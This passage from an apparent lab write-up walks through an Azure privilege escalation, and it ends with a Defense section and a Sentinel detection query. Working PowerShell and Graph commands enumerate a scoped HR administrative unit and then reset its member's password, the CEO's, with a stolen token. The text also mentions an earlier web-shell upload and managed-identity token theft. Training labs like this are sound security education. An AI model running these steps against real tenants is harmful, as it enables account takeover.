IsMemberManagementRestricted  : False                                                                                                                                                                                                       
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

DeletedDateTime               : 
Description                   : Initial administrative unit for new engineering hires
DisplayName                   : ONBOARDING-ENGINEERING
Extensions                    : 
Id                            : 4a3288aa-1a8b-485a-8ced-2bd80feef625
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

DeletedDateTime               : 
Description                   : Administrative unit for Mega Big Tech integration projects
DisplayName                   : CONTRACTORS
Extensions                    : 
Id                            : 57d14139-35e8-4cfb-a2a6-2b7dcd232436
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

DeletedDateTime               : 
Description                   : Teams bot password reset automation
DisplayName                   : User Management
Extensions                    : 
Id                            : beae0ee3-3284-4a4f-94c9-e3a20ef0f388
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

DeletedDateTime               : 
Description                   : Allows the HR team to manage user properties
DisplayName                   : HR-UNIT2
Extensions                    : 
Id                            : f123c66b-8c78-4bd1-947f-8d43b3a21d04
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}
```

We see an administrative unit has been created for HR. Let's see who is a member. Administrative unit members can have various actions performed on them.
```
$auId = "f123c66b-8c78-4bd1-947f-8d43b3a21d04"
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}
$urlUsers = "https://graph.microsoft.com/v1.0/directory/administrativeUnits/$auId/members/microsoft.graph.user"

$responseUsers = Invoke-RestMethod -Uri $urlUsers -Headers $headers -Method Get
$responseUsers.value
```
Let's retrieve members of administrative unit with Graph module, which shows us Seline Diaz - CEO
```
└─PS> Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId 'f123c66b-8c78-4bd1-947f-8d43b3a21d04'

Id                                   DeletedDateTime
--                                   ---------------
fd643bf6-23f4-4daa-b8d9-c79d9a02e24d 

```
```
└─PS> get-mguser -UserId fd643bf6-23f4-4daa-b8d9-c79d9a02e24d | fl

<SNIP>
DisplayName                           : Seline Diaz
<SNIP>
JobTitle                              : CEO
<SNIP>
```

We need to find out what role permissions have been defined in this administrative unit.
```
$adminUnitId = "f123c66b-8c78-4bd1-947f-8d43b3a21d04"
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

$url = "https://graph.microsoft.com/v1.0/directory/administrativeUnits/$adminUnitId/scopedRoleMembers"
$response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
$response.value | fl
```
```
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

$roleIds = @("b3995ee1-6548-46ae-861b-b916a0cf8dce")

foreach ($roleId in $roleIds) {
    $url = "https://graph.microsoft.com/v1.0/directoryRoles?`$filter=id eq '$roleId'"
    $roleDetails = Invoke-RestMethod -Uri $url -Headers $headers -Method Get

    if ($roleDetails.value.Count -gt 0) {
        foreach ($role in $roleDetails.value) {
            Write-Host "Role ID: $($role.id)"
            Write-Host "Display Name: $($role.displayName)"
            Write-Host "Description: $($role.description)"
            Write-Host "----------------------"
        }
    }
    else {
        Write-Host "No details found for Role ID: $roleId"
    }
}
```
With Graph module
```
└─PS> $ScopedRoleMembers = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId f123c66b-8c78-4bd1-947f-8d43b3a21d04
```
```
└─PS>  $ScopedRoleMembers
Id                                                                AdministrativeUnitId                 RoleId
--                                                                --------------------                 ------
Wz_yRLtppEGkF8VCd3LeQWvGI_F4jNFLlH-NQ7OiHQTEs2y1FcE6Tp41VhSioyw8S f123c66b-8c78-4bd1-947f-8d43b3a21d04 44f23f5b-69bb-41a4-a417-c5427772de41
4V6Zs0hlrkaGG7kWoM-NzmvGI_F4jNFLlH-NQ7OiHQTEs2y1FcE6Tp41VhSioyw8S f123c66b-8c78-4bd1-947f-8d43b3a21d04 b3995ee1-6548-46ae-861b-b916a0cf8dce
```
```
└─PS> Get-MgDirectoryRole -DirectoryRoleId 44f23f5b-69bb-41a4-a417-c5427772de41 | fl

DeletedDateTime      : 
Description          : Can manage all aspects of users and groups, including resetting passwords for limited admins.
DisplayName          : User Administrator
Id                   : 44f23f5b-69bb-41a4-a417-c5427772de41
Members              : 
RoleTemplateId       : fe930be7-5e62-47db-91af-98c3a49a38b1
ScopedMembers        : 
AdditionalProperties : {[@odata.context, https://graph.microsoft.com/v1.0/$metadata#directoryRoles/$entity]}
```
```
└─PS> Get-MgDirectoryRole -DirectoryRoleId b3995ee1-6548-46ae-861b-b916a0cf8dce | fl

DeletedDateTime      : 
Description          : Can reset passwords for non-administrators and Password Administrators.
DisplayName          : Password Administrator
Id                   : b3995ee1-6548-46ae-861b-b916a0cf8dce
Members              : 
RoleTemplateId       : 966707d0-3269-4727-9be2-8c3a10f19b9d
ScopedMembers        : 
AdditionalProperties : {[@odata.context, https://graph.microsoft.com/v1.0/$metadata#directoryRoles/$entity]}

```
It's very common for IT Helpdesk and user management software to have permissions to reset user passwords. In this case it seems that the password for the Mega Big Tech executive can only be reset through the HR system, perhaps as an additional security measure. We could reset the password for the CEO and access the keys
```
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

$body = @{
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = "<REDACTED>"
    }
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/fd643bf6-23f4-4daa-b8d9-c79d9a02e24d" -Headers $headers -Method PATCH -Body $body
```
With Graph module
```
$passwordProfile = @{
    forceChangePasswordNextSignIn = $false
    password = "<REDACTED>"
}
```
```
└─PS> Update-MgUser -UserId fd643bf6-23f4-4daa-b8d9-c79d9a02e24d -PasswordProfile $passwordProfile
```

We successfully login as CEO

![](passwordless-credentials-for-access-and-escalation-4.png)

# Attack Path
Attack path visualization created by [Mathias Persson](https://www.linkedin.com/in/mathias-persson-582b60197/) for Pwned Labs

![](passwordless-credentials-for-access-and-escalation-5.png)

# Defense

- Exposed HrPortal service principal certificate was the primary cause of the breach
  - Website Contributor privileges allowed us to retrieve FTPS credentials contained in the publish profile
  - Allowed uploading a PHP web shell 
  - Exfiltrated the `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` headers to contruct a request for a ARM and Graph access token for managed identity
- Compromised managed identity had been assigned User Administrator privileges scoped to this administrative unit
  - HR administrative unit had Mega Big Tech CEO as a member
  - Successfully reset CEO's password and got access to other resources
- It's important to detect on malicious activity as soon as possible. The security team could use Sentinel to alert on unusual service principal usage that may indicate malicious activity.

![](passwordless-credentials-for-access-and-escalation-6.png)

- It may also be uncommon for identifies to retrieve the Web App publish profile, and this can also be detected and alerted on using Sentinel.
```
// Display Activity log Administrative events 
// Displays Activity log for Administrative category. 
AzureActivity 
| where CategoryValue == "Administrative" and OperationNameValue contains "MICROSOFT.WEB/SITES/PUBLISHXML/ACTION"
| order by TimeGenerated desc
```

![](passwordless-credentials-for-access-and-escalation-7.png)
